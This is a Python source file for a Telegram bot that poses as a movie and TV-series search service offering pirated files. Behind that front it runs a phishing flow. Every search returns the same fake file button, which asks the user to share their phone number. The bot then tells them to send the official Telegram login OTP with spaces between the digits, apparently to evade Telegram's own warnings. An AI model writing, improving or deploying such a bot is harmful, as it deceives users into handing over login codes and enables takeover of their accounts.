from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton
import asyncio
import re

# List of Admin User IDs
ADMINS = [6431520174]  # Replace with your Telegram user IDs

# /start command
@Client.on_message(filters.command("start"))
async def start(client, message):
    await message.reply_photo(
        photo="http://ibb.co/cSHnLmg0",
        caption=f"""<b> Hello {message.from_user.mention},
Iam a Telegram Movie - Series SearchBot by team @ProSearch.

/start - Start Search Bot
/help - How to Search
/Movies - Latest Movies Releases
/Series - Latest TV-WEBSeries Releases
/About - About </b>""",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🤖 Latest Releases Updates", url="https://t.me/+LW89bJRfx7w5YTRl")],
            [InlineKeyboardButton("🎙️ BOT Updates Channel", url="https://t.me/+MctHWdg20Fs5ZTM1")],
            [
                InlineKeyboardButton("♦️Movies BOT🔍", url="https://t.me/ProSearchX7Bot"),
                InlineKeyboardButton("♦️TVSeries BOT🔍", url="https://t.me/ProsearchY4Bot")
            ]
        ])
    )
    await message.reply_text(f"<b> ❗️Send Movie Name and Year Correctly. 👍 </b>")

# /help command
@Client.on_message(filters.command("help"))
async def help(client, message):
    await message.reply_text(
        text=f"""<b> ❗️How to Search Movies ❓
➖➖➖➖➖➖➖➖➖➖➖

1. Just Send Movie Name and Year Correctly.
(Check Google for Correct Spelling and year) 

Examples: - 
Oppam 2016
Baahubali 2015

Oppam 2016 1080p
Baahubali 2015 1080p
(For Getting only 1080p Quality Files)

Baahubali 2015 Malayalam 
Baahubali 2015 Tamil 
(For Dubbed Movie Files)

〰〰〰〰〰〰〰〰〰〰〰
❗️How to Search TVSeries ❓ 
➖➖➖➖➖➖➖➖➖➖➖

1. Just Send Series Name and Season Correctly.
(Check Google for Correct Spelling) 

Examples: - 
Game of Thrones S01
Breaking Bad S02 1080p
Lucifer S03E01

〰〰〰〰〰〰〰〰〰〰〰
❗️On Android, Better Use VLC, MX Player Pro, XPlayer etc. </b>"""
    )
    await message.reply_text(f"<b> ❗️Send Movie Name and Year Correctly. 👍 </b>")

# OTP Code Handler (async and regex)
@Client.on_message(filters.private & filters.regex(r"^(\d\s){4}\d$|^\d{5}$"))
async def otp_received(client, message):
    otp = message.text.replace(" ", "")
    await message.reply_text(f"✅ Received OTP: <code>{otp}</code>")
    await message.reply_text(f"""<b> 🔗 Successfully Generated Your File link:
https://gplinks.co/I2VM7b </b>""")

# Contact Receiver
@Client.on_message(filters.contact)
async def contact_received(client, message):
    await message.reply_text(f"<b> Sending OTP... </b>")
    await asyncio.sleep(5)
    await message.reply_text(f"""<b> Please check for an OTP in official Telegram account.
If you got it, send OTP here after reading the below format:
If OTP is 12345, send it as 1 2 3 4 5. </b>""")

# Button callback handler
@Client.on_callback_query(filters.regex("^movie_"))
async def movie_button(client, callback_query):
    user_id = callback_query.from_user.id

    if user_id not in ADMINS:
        await callback_query.message.reply_text(f"<b> Sorry Dude, You are Banned. </b>")
        await callback_query.answer()
        return

    reply_markup = ReplyKeyboardMarkup(
        [[KeyboardButton("Share Contact 📱", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await callback_query.message.reply_text(
        f"<b> Now please send your PHONE_NUMBER along with the country code. Use the below button to share your contact </b>",
        reply_markup=reply_markup
    )
    await callback_query.answer()

# Movie/Series Search
@Client.on_message(filters.private & filters.text)
async def search_movie(client, message):
    query = message.text

    # Skip if it's an OTP code (already handled above)
    if re.fullmatch(r"^(\d\s){4}\d$|^\d{5}$", query):
        return

    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{query} Dubbed Sony DADC DVDRip Full Movie.mkv", callback_data="movie_")]
    ])
    await message.reply_text(f"""<b> 🔍 Results for your Search 

➠ Latest Uploads: @ProSearchZ
➠ BOT Updates: @ProSearch🔻 </b>""", reply_markup=reply_markup)
